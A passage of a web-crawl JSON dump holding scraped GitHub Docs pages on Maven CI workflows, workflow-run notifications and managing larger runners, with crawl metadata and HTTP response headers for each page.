workflow template for Maven that should work for most Java with Maven projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIf you already have a workflow in your repository, click New workflow.\nThe \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"Java with Maven\".\nOn the \"Java with Maven\" workflow, click Configure.\nEdit the workflow as required. For example, change the Java version.\nClick Commit changes.\nThe maven.yml workflow file is added to the .github/workflows directory of your repository.\nSpecifying the Java version and architecture\nThe workflow template sets up the PATH to contain OpenJDK 8 for the x64 platform. If you want to use a different version of Java, or target a different architecture (x64 or x86), you can use the setup-java action to choose a different Java runtime environment.\nFor example, to use version 11 of the JDK provided by Adoptium for the x64 platform, you can use the setup-java action and configure the java-version, distribution and architecture parameters to '11', 'temurin' and x64.\nYAML\nsteps: - uses: actions/checkout@v4 - name: Set up JDK 11 for x64 uses: actions/setup-java@v4 with: java-version: '11' distribution: 'temurin' architecture: x64 \nFor more information, see the setup-java action.\nBuilding and testing your code\nYou can use the same commands that you use locally to build and test your code.\nThe workflow template will run the package target by default. In the default Maven configuration, this command will download dependencies, build classes, run tests, and package classes into their distributable format, for example, a JAR file.\nIf you use different commands to build your project, or you want to use a different target, you can specify those. For example, you may want to run the verify target that's configured in a pom-ci.xml file.\nYAML\nsteps: - uses: actions/checkout@v4 - uses: actions/setup-java@v4 with: java-version: '17' distribution: 'temurin' - name: Run the Maven verify phase run: mvn --batch-mode --update-snapshots verify \nCaching dependencies\nYou can cache your dependencies to speed up your workflow runs. After a successful run, your local Maven repository will be stored in a cache. In future workflow runs, the cache will be restored so that dependencies don't need to be downloaded from remote Maven repositories. You can cache dependencies simply using the setup-java action or can use cache action for custom and more advanced configuration.\nYAML\nsteps: - uses: actions/checkout@v4 - name: Set up JDK 17 uses: actions/setup-java@v4 with: java-version: '17' distribution: 'temurin' cache: maven - name: Build with Maven run: mvn --batch-mode --update-snapshots verify \nThis workflow will save the contents of your local Maven repository, located in the .m2 directory of the runner's home directory. The cache key will be the hashed contents of pom.xml, so changes to pom.xml will invalidate the cache.\nPackaging workflow data as artifacts\nAfter your build has succeeded and your tests have passed, you may want to upload the resulting Java packages as a build artifact. This will store the built packages as part of the workflow run, and allow you to download them. Artifacts can help you test and debug pull requests in your local environment before they're merged. For more information, see Storing and sharing data from a workflow.\nMaven will usually create output files like JARs, EARs, or WARs in the target directory. To upload those as artifacts, you can copy them into a new directory that contains artifacts to upload. For example, you can create a directory called staging. Then you can upload the contents of that directory using the upload-artifact action.\nYAML\nsteps: - uses: actions/checkout@v4 - uses: actions/setup-java@v4 with: java-version: '17' distribution: 'temurin' - run: mvn --batch-mode --update-snapshots verify - run: mkdir staging && cp target/*.jar staging - uses: actions/upload-artifact@v4 with: name: Package path: staging",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-maven-qlehh.html",
  "markdown": "# Building and testing Java with Maven\n\nYou can create a continuous integration (CI) workflow in GitHub Actions to build and test your Java project with Maven.\n\n## [Introduction](#introduction)\n\nThis guide shows you how to create a workflow that performs continuous integration (CI) for your Java project using the Maven software project management tool. The workflow you create will allow you to see when commits to a pull request cause build or test failures against your default branch; this approach can help ensure that your code is always healthy. You can extend your CI workflow to cache files and upload artifacts from a workflow run.\n\nGitHub-hosted runners have a tools cache with pre-installed software, which includes Java Development Kits (JDKs) and Maven. For a list of software and the pre-installed versions for JDK and Maven, see [Using GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners#supported-software).\n\n## [Prerequisites](#prerequisites)\n\nYou should be familiar with YAML and the syntax for GitHub Actions. For more information, see:\n\n*   [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)\n*   [Writing workflows](https://docs.github.com/en/actions/learn-github-actions)\n\nWe recommend that you have a basic understanding of Java and the Maven framework. For more information, see the [Maven Getting Started Guide](https://maven.apache.org/guides/getting-started/index.html) in the Maven documentation.\n\n## [Using a Maven workflow template](#using-a-maven-workflow-template)\n\nTo get started quickly, add a workflow template to the `.github/workflows` directory of your repository.\n\nGitHub provides a workflow template for Maven that should work for most Java with Maven projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  If you already have a workflow in your repository, click **New workflow**.\n    \n4.  The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"Java with Maven\".\n    \n5.  On the \"Java with Maven\" workflow, click **Configure**.\n    \n6.  Edit the workflow as required. For example, change the Java version.\n    \n7.  Click **Commit changes**.\n    \n    The `maven.yml` workflow file is added to the `.github/workflows` directory of your repository.\n    \n\n### [Specifying the Java version and architecture](#specifying-the-java-version-and-architecture)\n\nThe workflow template sets up the `PATH` to contain OpenJDK 8 for the x64 platform. If you want to use a different version of Java, or target a different architecture (`x64` or `x86`), you can use the `setup-java` action to choose a different Java runtime environment.\n\nFor example, to use version 11 of the JDK provided by Adoptium for the x64 platform, you can use the `setup-java` action and configure the `java-version`, `distribution` and `architecture` parameters to `'11'`, `'temurin'` and `x64`.\n\nYAML\n\n```\nsteps:\n  - uses: actions/checkout@v4\n  - name: Set up JDK 11 for x64\n    uses: actions/setup-java@v4\n    with:\n      java-version: '11'\n      distribution: 'temurin'\n      architecture: x64\n```\n\nFor more information, see the [`setup-java`](https://github.com/actions/setup-java) action.\n\n## [Building and testing your code](#building-and-testing-your-code)\n\nYou can use the same commands that you use locally to build and test your code.\n\nThe workflow template will run the `package` target by default. In the default Maven configuration, this command will download dependencies, build classes, run tests, and package classes into their distributable format, for example, a JAR file.\n\nIf you use different commands to build your project, or you want to use a different target, you can specify those. For example, you may want to run the `verify` target that's configured in a `pom-ci.xml` file.\n\nYAML\n\n```\nsteps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-java@v4\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n  - name: Run the Maven verify phase\n    run: mvn --batch-mode --update-snapshots verify\n```\n\n## [Caching dependencies](#caching-dependencies)\n\nYou can cache your dependencies to speed up your workflow runs. After a successful run, your local Maven repository will be stored in a cache. In future workflow runs, the cache will be restored so that dependencies don't need to be downloaded from remote Maven repositories. You can cache dependencies simply using the [`setup-java` action](https://github.com/marketplace/actions/setup-java-jdk) or can use [`cache` action](https://github.com/actions/cache) for custom and more advanced configuration.\n\nYAML\n\n```\nsteps:\n  - uses: actions/checkout@v4\n  - name: Set up JDK 17\n    uses: actions/setup-java@v4\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n      cache: maven\n  - name: Build with Maven\n    run: mvn --batch-mode --update-snapshots verify\n```\n\nThis workflow will save the contents of your local Maven repository, located in the `.m2` directory of the runner's home directory. The cache key will be the hashed contents of `pom.xml`, so changes to `pom.xml` will invalidate the cache.\n\n## [Packaging workflow data as artifacts](#packaging-workflow-data-as-artifacts)\n\nAfter your build has succeeded and your tests have passed, you may want to upload the resulting Java packages as a build artifact. This will store the built packages as part of the workflow run, and allow you to download them. Artifacts can help you test and debug pull requests in your local environment before they're merged. For more information, see [Storing and sharing data from a workflow](https://docs.github.com/en/actions/using-workflows/storing-workflow-data-as-artifacts).\n\nMaven will usually create output files like JARs, EARs, or WARs in the `target` directory. To upload those as artifacts, you can copy them into a new directory that contains artifacts to upload. For example, you can create a directory called `staging`. Then you can upload the contents of that directory using the `upload-artifact` action.\n\nYAML\n\n```\nsteps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-java@v4\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n  - run: mvn --batch-mode --update-snapshots verify\n  - run: mkdir staging && cp target/*.jar staging\n  - uses: actions/upload-artifact@v4\n    with:\n      name: Package\n      path: staging\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 248,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-maven-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-maven-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-maven-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-maven-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-java-with-maven-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 10592,
      "readableText": 9924,
      "none": 34782,
      "readableTextIfPossible": 9924,
      "result": 9924,
      "markdown": 6832
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/notifications-for-workflow-runs",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/notifications-for-workflow-runs",
    "loadedTime": "2025-05-08T06:38:13.810Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/notifications-for-workflow-runs",
    "title": "Notifications for workflow runs - GitHub Docs",
    "description": "You can subscribe to notifications about workflow runs that you trigger.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Notifications for workflow runs - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/notifications-for-workflow-runs"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/notifications-for-workflow-runs"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "989D:132AFF:EF5A74:1381303:681C514F",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:38:07 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686287.226407, VS0, VE279",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "23749",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Notifications for workflow runs - GitHub Docs\nYou can subscribe to notifications about workflow runs that you trigger.\nIf you enable email or web notifications for GitHub Actions, you'll receive a notification when any workflow runs that you've triggered have completed. The notification will include the workflow run's status (including successful, failed, neutral, and canceled runs). You can also choose to receive a notification only when a workflow run has failed. For more information about enabling or disabling notifications, see About notifications.\nNotifications for scheduled workflows are sent to the user who initially created the workflow. If a different user updates the cron syntax in the workflow file, subsequent notifications will be sent to that user instead. If a scheduled workflow is disabled and then re-enabled, notifications will be sent to the user who re-enabled the workflow rather than the user who last modified the cron syntax.\nYou can also see the status of workflow runs on a repository's Actions tab. For more information, see Managing workflow runs and deployments.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-notifications-for-workflow-runs-as44n.html",
  "markdown": "# Notifications for workflow runs - GitHub Docs\n\nYou can subscribe to notifications about workflow runs that you trigger.\n\nIf you enable email or web notifications for GitHub Actions, you'll receive a notification when any workflow runs that you've triggered have completed. The notification will include the workflow run's status (including successful, failed, neutral, and canceled runs). You can also choose to receive a notification only when a workflow run has failed. For more information about enabling or disabling notifications, see [About notifications](https://docs.github.com/en/account-and-profile/managing-subscriptions-and-notifications-on-github/setting-up-notifications/about-notifications).\n\nNotifications for scheduled workflows are sent to the user who initially created the workflow. If a different user updates the cron syntax in the workflow file, subsequent notifications will be sent to that user instead. If a scheduled workflow is disabled and then re-enabled, notifications will be sent to the user who re-enabled the workflow rather than the user who last modified the cron syntax.\n\nYou can also see the status of workflow runs on a repository's Actions tab. For more information, see [Managing workflow runs and deployments](https://docs.github.com/en/actions/managing-workflow-runs).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 229,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-notifications-for-workflow-runs-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-notifications-for-workflow-runs-removedElementsHtmlUr",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-notifications-for-workflow-runs-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-notifications-for-workflow-runs-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-notifications-for-workflow-runs-readableTextIfPossibl"
    },
    "lengths": {
      "extractus": 1365,
      "readableText": 1564,
      "none": 21484,
      "readableTextIfPossible": 21484,
      "result": 1564,
      "markdown": 1314
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners/managing-larger-runners",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners/managing-larger-runners",
    "loadedTime": "2025-05-08T06:38:16.315Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners/managing-larger-runners",
    "title": "Managing larger runners - GitHub Docs",
    "description": "You can configure larger runners for your organization or enterprise.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Managing larger runners - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/using-github-hosted-runners/using-larger-runners/managing-larger-runners"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/using-github-hosted-runners/using-larger-runners/managing-larger-runners"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "4387:8387A:F001CE:138C7D9:681C5152",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:38:10 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686291.634162, VS0, VE294",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "30142",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Managing larger runners - GitHub Docs\nYou can configure larger runners for your organization or enterprise.\nWho can use this feature?\nLarger runners are only available for organizations and enterprises using the GitHub Team or GitHub Enterprise Cloud plans.\nEnterprise or organization owners can manage larger runners.\nNote\nThe information and instructions in this article only apply to larger runners with Linux and Windows operating systems.\nAdding a larger runner to an organization\nOrganization owners can add a larger runner to an organization control which repositories can use it. When you create a new runner for an organization, by default, all repositories in the organization have access to the runner. To limit which repositories can use the runner, assign it to a runner group with access to specific repositories. For more information, see Allowing repositories to access larger runners.\nYou can choose an operating system and a hardware configuration from the list of available options. When new instances of this runner are deployed through autoscaling, they'll use the same operating system and hardware configuration you've defined here.\nNew runners are automatically assigned to the default group, or you can choose which group the runners must join during the runner creation process. In addition, you can modify the runner's group membership after you've registered the runner. For more information, see Controlling access to larger runners.\nOn GitHub, navigate to the main page of the organization.\nUnder your organization name, click Settings. If you cannot see the \"Settings\" tab, select the dropdown menu, then click Settings.\nIn the left sidebar, click Actions, then click Runners.\nClick New runner, then click New GitHub-hosted runner.\nComplete the required details to configure your new runner:\nName: Enter a name for your new runner. For easier identification, this should indicate its hardware and operating configuration, such as ubuntu-20.04-16core.\nPlatform: Choose a platform from the available options. Once you've selected a platform, you will be able to choose a specific image.\nImage: Choose an image from the available options. Once you've selected an image, you will be able to choose a specific size.\nGitHub-owned: For images managed by GitHub, select an image under this tab.\nPartner: For images managed by a partner, select an image under this tab. ex: Base Windows 11 desktop, GPU-optimized, and arm64 images are located under this tab.\nSize: Choose a hardware configuration from the list of available options. The available sizes depend on the image that you selected in a previous step. For GPU runners, select a size under the GPU-powered tab.\nMaximum concurrency: Choose the maximum number of jobs that can be active at any time.\nRunner group: Choose the group that your runner will be a member of. This group will host multiple instances of your runner, as they scale up and down to suit demand.\nNote\nThe names of larger runners can dictate their functionality. For example, to use a larger runner for code scanning default setup, the runner must be named code-scanning. For more information on code scanning with larger runners, see Configuring larger runners for default setup.\nClick Create runner.\nTo allow repositories to access your larger runners, add them to the list of repositories that can use it. For more information, see Allowing repositories to access larger runners.\nAllowing repositories to access larger runners\nRepositories are granted access to larger runners through runner groups. Enterprise administrators can choose which organizations are granted access to enterprise-level runner groups, and organization owners control repository-level access to all larger runners.\nOrganization owners can use and configure enterprise-level runner groups for the repositories in their organization, or they can create organization-level runner groups to control access.\nFor enterprise-level runner groups: By default, repositories in an organization do not have access to enterprise-level runner groups. To give repositories access to enterprise runner groups, organization owners must configure each enterprise runner group and choose which repositories have access.\nFor organization-level runner groups: By default, all repositories in an organization are granted access to organization-level runner groups. To restrict which repositories have access, organization owners must configure organization runner groups and choose which repositories have access.\nOnce a repository has access to larger runners, the larger runners can be added to workflow files. For more information, see Running jobs on larger runners.\nNavigate to the main page of the organization where your runner groups are located.\nClick Settings.\nIn the left sidebar, click Actions, then click Runner groups.\nSelect a runner group from either list on the page. Organization-level runner groups are listed at the top of the page, and enterprise-level runner groups are listed under \"Shared by the Enterprise.\"\nOn the runner group page, under \"Repository access,\" select All repositories or Selected repositories. If you choose to grant access to specific repositories, click , then select the repositories you would like to grant access to from the list.\nWarning\nIf you are using a Fixed IP range, we recommend that you only use larger runners with private repositories. Forks of your repository can potentially run dangerous code on your larger runner by creating a pull request that executes the code in a workflow. For more information, see Controlling access to larger runners.\nChanging the name of a larger runner\nNote\nThe names of larger runners can dictate their functionality. For example, to use a larger runner for code scanning default setup, the runner must be named code-scanning. For more information on code scanning with larger runners, see Configuring larger runners for default setup.\nOn GitHub, navigate to the main page of the organization.\nUnder your organization name, click Settings. If you cannot see the \"Settings\" tab, select the dropdown menu, then click Settings.\nIn the left sidebar, click Actions, then click Runners.\nIn the list of runners, select the runner you would like to edit.\nEnter a new name for the runner in the text field under \"Name.\"\nClick Save.\nChanging the size of a larger runner\nOn GitHub, navigate to the main page of the organization.\nUnder your organization name, click Settings. If you cannot see the \"Settings\" tab, select the dropdown menu, then click Settings.\nIn the left sidebar, click Actions, then click Runners.\nIn the list of runners, select the runner you would like to edit.\nSelect a new size for the runner from the list of available options under \"Size.\" The available sizes depend on the image that is installed on the runner.\nClick Save.\nChanging the image of a larger runner\nOn GitHub, navigate to the main page of the organization.\nUnder your organization name, click Settings. If you cannot see the \"Settings\" tab, select the dropdown menu, then click Settings.\nIn the left sidebar, click Actions, then click Runners.\nIn the list of runners, select the runner you would like to edit.\nSelect a new image for the runner from the list of available options under \"Image.\" The available images are limited to GitHub-owned images.\nClick Save.\nConfiguring autoscaling for larger runners\nYou can control the maximum number of jobs allowed to run concurrently for specific runner sets. Setting this field to a higher value can help prevent workflows being blocked due to parallelism.\nOn GitHub, navigate to the main page of the organization.\nUnder your organization name, click Settings. If you cannot see the \"Settings\" tab, select the dropdown menu, then click Settings.\nIn the left sidebar, click Actions, then click Runners.\nIn the list of runners, select the runner you would like to edit.\nIn the \"Auto-scaling\" section, under \"Maximum Job Concurrency,\" enter the maximum number of jobs you would like to allow to run at the same time.\nClick Save.\nCreating static IP addresses for larger runners\nYou can enable static IP addresses for larger runners. When you do this, the larger runners are assigned static IP address ranges. All IP addresses in the range assigned are usable and not in CIDR notation. By default, you can configure up to 10 different larger runners with IP ranges for your account. If you would like to use more than 10 larger runners with static IP address ranges, please contact us through the GitHub Support portal.\nThe number of available IP addresses in the assigned ranges does not restrict number of concurrent jobs specified for autoscaling. Within a runner pool, there is a load balancer which allows for high reuse of the IP addresses in the assigned ranges. This ensures your workflows can run concurrently at scale while each machine is assigned a static IP address.\nOn GitHub, navigate to the main page of the organization.\nUnder your organization name, click Settings. If you cannot see the \"Settings\" tab, select the dropdown menu, then click Settings.\nIn the left sidebar, click Actions, then click Runners.\nIn the list of runners, select the runner you would like to edit.\nTo assign static IP addresses to the runner, under \"Networking,\" check Assign unique & static public IP address ranges for this runner.\nClick Save.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-larger-runners-managing-larger-runners-glcl0f.html",
  "markdown": "# Managing larger runners - GitHub Docs\n\nYou can configure larger runners for your organization or enterprise.\n\n## Who can use this feature?\n\nLarger runners are only available for organizations and enterprises using the GitHub Team or GitHub Enterprise Cloud plans.\n\nEnterprise or organization owners can manage larger runners.\n\nNote\n\n*   The information and instructions in this article only apply to larger runners with Linux and Windows operating systems.\n\n## [Adding a larger runner to an organization](#adding-a-larger-runner-to-an-organization)\n\nOrganization owners can add a larger runner to an organization control which repositories can use it. When you create a new runner for an organization, by default, all repositories in the organization have access to the runner. To limit which repositories can use the runner, assign it to a runner group with access to specific repositories. For more information, see [Allowing repositories to access larger runners](#allowing-repositories-to-access-larger-runners).\n\nYou can choose an operating system and a hardware configuration from the list of available options. When new instances of this runner are deployed through autoscaling, they'll use the same operating system and hardware configuration you've defined here.\n\nNew runners are automatically assigned to the default group, or you can choose which group the runners must join during the runner creation process. In addition, you can modify the runner's group membership after you've registered the runner. For more information, see [Controlling access to larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/controlling-access-to-larger-runners).\n\n1.  On GitHub, navigate to the main page of the organization.\n    \n2.  Under your organization name, click **Settings**. If you cannot see the \"Settings\" tab, select the dropdown menu, then click **Settings**.\n    \n    ![Screenshot of the tabs in an organization's profile. The \"Settings\" tab is outlined in dark orange.](https://docs.github.com/assets/cb-49309/images/help/discussions/org-settings-global-nav-update.png)\n    \n3.  In the left sidebar, click **Actions**, then click **Runners**.\n    \n4.  Click **New runner**, then click **New GitHub-hosted runner**.\n    \n5.  Complete the required details to configure your new runner:\n    \n    *   **Name:** Enter a name for your new runner. For easier identification, this should indicate its hardware and operating configuration, such as `ubuntu-20.04-16core`.\n        \n    *   **Platform:** Choose a platform from the available options. Once you've selected a platform, you will be able to choose a specific image.\n        \n    *   **Image:** Choose an image from the available options. Once you've selected an image, you will be able to choose a specific size.\n        \n        *   **GitHub-owned:** For images managed by GitHub, select an image under this tab.\n        *   **Partner:** For images managed by a partner, select an image under this tab. ex: Base Windows 11 desktop, GPU-optimized, and arm64 images are located under this tab.\n    *   **Size:** Choose a hardware configuration from the list of available options. The available sizes depend on the image that you selected in a previous step. For GPU runners, select a size under the **GPU-powered** tab.\n        \n    *   **Maximum concurrency:** Choose the maximum number of jobs that can be active at any time.\n        \n    *   **Runner group:** Choose the group that your runner will be a member of. This group will host multiple instances of your runner, as they scale up and down to suit demand.\n        \n    \n    Note\n    \n    The names of larger runners can dictate their functionality. For example, to use a larger runner for code scanning default setup, the runner must be named `code-scanning`. For more information on code scanning with larger runners, see [Configuring larger runners for default setup](https://docs.github.com/en/code-security/code-scanning/managing-your-code-scanning-configuration/configuring-larger-runners-for-default-setup).\n    \n6.  Click **Create runner**.\n    \n7.  To allow repositories to access your larger runners, add them to the list of repositories that can use it. For more information, see [Allowing repositories to access larger runners](#allowing-repositories-to-access-larger-runners).\n    \n\n## [Allowing repositories to access larger runners](#allowing-repositories-to-access-larger-runners)\n\nRepositories are granted access to larger runners through runner groups. Enterprise administrators can choose which organizations are granted access to enterprise-level runner groups, and organization owners control repository-level access to all larger runners.\n\nOrganization owners can use and configure enterprise-level runner groups for the repositories in their organization, or they can create organization-level runner groups to control access.\n\n*   **For enterprise-level runner groups:** By default, repositories in an organization do not have access to enterprise-level runner groups. To give repositories access to enterprise runner groups, organization owners must configure each enterprise runner group and choose which repositories have access.\n*   **For organization-level runner groups:** By default, all repositories in an organization are granted access to organization-level runner groups. To restrict which repositories have access, organization owners must configure organization runner groups and choose which repositories have access.\n\nOnce a repository has access to larger runners, the larger runners can be added to workflow files. For more information, see [Running jobs on larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/running-jobs-on-larger-runners).\n\n1.  Navigate to the main page of the organization where your runner groups are located.\n2.  Click **Settings**.\n3.  In the left sidebar, click **Actions**, then click **Runner groups**.\n4.  Select a runner group from either list on the page. Organization-level runner groups are listed at the top of the page, and enterprise-level runner groups are listed under \"Shared by the Enterprise.\"\n5.  On the runner group page, under \"Repository access,\" select **All repositories** or **Selected repositories**. If you choose to grant access to specific repositories, click , then select the repositories you would like to grant access to from the list.\n\nWarning\n\nIf you are using a Fixed IP range, we recommend that you only use larger runners with private repositories. Forks of your repository can potentially run dangerous code on your larger runner by creating a pull request that executes the code in a workflow. For more information, see [Controlling access to larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/controlling-access-to-larger-runners).\n\n## [Changing the name of a larger runner](#changing-the-name-of-a-larger-runner)\n\nNote\n\nThe names of larger runners can dictate their functionality. For example, to use a larger runner for code scanning default setup, the runner must be named `code-scanning`. For more information on code scanning with larger runners, see [Configuring larger runners for default 